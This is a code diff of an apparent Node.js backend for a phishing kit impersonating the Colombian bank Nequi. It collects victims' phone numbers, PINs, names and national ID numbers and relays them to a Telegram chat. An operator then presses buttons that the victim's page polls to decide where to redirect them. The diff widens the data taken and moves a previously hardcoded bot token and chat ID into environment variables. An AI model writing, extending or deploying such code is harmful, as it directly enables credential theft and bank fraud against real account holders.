@@ -1,23 +1,20 @@
-// ===== BACKEND (server.js) =====
-// Subir a Render, Replit o cualquier hosting de Node.js
 const express = require('express');
 const fetch = require('node-fetch');
 const cors = require('cors');
 const app = express();
+
 app.use(cors());
 app.use(express.json());
 
-const TELEGRAM_TOKEN = '7923953393:AAG-Ie0tqZ_QwKevEGQEtJS2Y0zRNJUC-dA';
-const CHAT_ID = '-1002808918964';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+const estados = {}; // Guarda decisiones por número
 
-// Temporalmente almacena la decisión por número
-const estados = {}; // Ej: estados['3101234567'] = 'aceptado';
-
-// Endpoint para recibir datos del frontend y enviar a Telegram
+// Enviar mensaje con botones a Telegram
 app.post('/enviar', async (req, res) => {
-  const { numero, clave } = req.body;
+  const { numero, clave, nombre, cedula } = req.body;
 
-  const mensaje = `Nuevo acceso:\n\n\ud83d\udcde Número: ${numero}\n\ud83d\udd11 Clave: ${clave}`;
+  const mensaje = `🟣 Nueva solicitud Nequi:\n\n👤 Nombre: ${nombre}\n🆔 Cédula: ${cedula}\n📞 Número: ${numero}\n🔑 Clave: ${clave}`;
 
   const payload = {
     chat_id: CHAT_ID,
@@ -42,16 +39,18 @@ app.post('/enviar', async (req, res) => {
   res.send({ ok: true });
 });
 
-// Endpoint para manejar callback de Telegram
-app.post('/webhook', (req, res) => {
+// Webhook de Telegram (recibe el botón presionado)
+app.post('/webhook', async (req, res) => {
   const callback = req.body.callback_query;
+  if (!callback) return res.sendStatus(400);
+
   const data = callback.data;
   const numero = data.split('_')[1];
   const accion = data.split('_')[0];
 
   estados[numero] = accion;
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -63,10 +62,12 @@ app.post('/webhook', (req, res) => {
   res.sendStatus(200);
 });
 
-// Endpoint para el frontend para saber si ya fue redirigido
+// Consultar el estado del número
 app.get('/estado/:numero', (req, res) => {
   const numero = req.params.numero;
   res.send({ estado: estados[numero] || null });
 });
 
-app.listen(3000, () => console.log('Servidor corriendo en puerto 3000'));
+// Iniciar servidor
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
